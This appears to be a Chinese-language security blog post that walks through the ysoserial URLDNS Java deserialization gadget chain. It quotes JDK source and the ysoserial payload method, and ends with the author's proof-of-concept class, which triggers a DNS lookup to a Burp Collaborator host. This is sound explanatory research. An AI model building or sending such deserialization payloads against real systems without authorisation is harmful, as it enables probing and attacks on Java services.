---
title: "Ysoserial URLDNS分析"
date: 2020-02-12T22:28:34+08:00
draft: false
tags:
- java
- ysoserial
series:
-
categories:
- 代码审计
---

简单的gadget构造。
<!--more-->

## 分析

先来看ysoserial的payload
```java
public Object getObject(final String url) throws Exception {

    //Avoid DNS resolution during payload creation
    //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
    URLStreamHandler handler = new SilentURLStreamHandler();

    HashMap ht = new HashMap(); // HashMap that will contain the URL
    URL u = new URL(null, url, handler); // URL to use as the Key
    ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

    Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

    return ht;
}
```
可以看到是HashMap类的问题，而触发反序列化的⽅法是 readObject ，直奔 HashMap 类的 readObject ⽅法：
```java
private void readObject(java.io.ObjectInputStream s)
    throws IOException, ClassNotFoundException {
    // Read in the threshold (ignored), loadfactor, and any hidden stuff
    s.defaultReadObject();
    reinitialize();
    if (loadFactor <= 0 || Float.isNaN(loadFactor))
        throw new InvalidObjectException("Illegal load factor: " +
                                         loadFactor);
    s.readInt();                // Read and ignore number of buckets
    int mappings = s.readInt(); // Read number of mappings (size)
    if (mappings < 0)
        throw new InvalidObjectException("Illegal mappings count: " +
                                         mappings);
    else if (mappings > 0) { // (if zero, use defaults)
        // Size the table using given load factor only if within
        // range of 0.25...4.0
        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
        float fc = (float)mappings / lf + 1.0f;
        int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                   DEFAULT_INITIAL_CAPACITY :
                   (fc >= MAXIMUM_CAPACITY) ?
                   MAXIMUM_CAPACITY :
                   tableSizeFor((int)fc));
        float ft = (float)cap * lf;
        threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                     (int)ft : Integer.MAX_VALUE);

        // Check Map.Entry[].class since it's the nearest public type to
        // what we're actually creating.
        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);
        @SuppressWarnings({"rawtypes","unchecked"})
        Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
        table = tab;

        // Read the keys and values, and put the mappings in the HashMap
        for (int i = 0; i < mappings; i++) {
            @SuppressWarnings("unchecked")
            K key = (K) s.readObject();
            @SuppressWarnings("unchecked")
            V value = (V) s.readObject();
            putVal(hash(key), key, value, false, false);
        }
    }
}
```
在最后进行了hash(key)计算，跟进
```java
static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```
进行了hashCode()函数，而key此时是我们传入的 java.net.URL 对象，那么跟进这个类的hashCode()方法看下
```java
public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;

    hashCode = handler.hashCode(this);
    return hashCode;
}
```
当hashCode字段等于-1时会进行handler.hashCode(this)计算，handler是定义的URLStreamHandler字段，那么进入java.net.URLStreamHandler#hashCode()

![image](https://y4er.com/img/uploads/20200216016235.png)

u是我们传入的URL，getHostAddress会进行dns查询。整个链比较简单：
1. HashMap->readObject()
2. HashMap->hash()
3. URL->hashCode()
4. URLStreamHandler->hashCode()
5. URLStreamHandler->getHostAddress()
6. InetAddress->getByName()

## 构造payload
```java
package com.sera.urldns;

import java.io.*;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

public class URLDNS implements Serializable {

    public static void main(String[] args) throws MalformedURLException, NoSuchFieldException, IllegalAccessException {

        URLStreamHandler handler = new URLStreamHandler() {
            @Override
            protected URLConnection openConnection(URL u) throws IOException {
                return null;
            }
        };
        HashMap hm = new HashMap();
        String url = "http://0jkp1tes60w8k6928kvujpirnit9hy.burpcollaborator.net";
        URL u = new URL(null, url, handler);
        Class clazz = u.getClass();

        Field field = clazz.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(u, -1);
        hm.put(u, url);
    }

}
```
![image](https://y4er.com/img/uploads/20200216015833.png)


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**

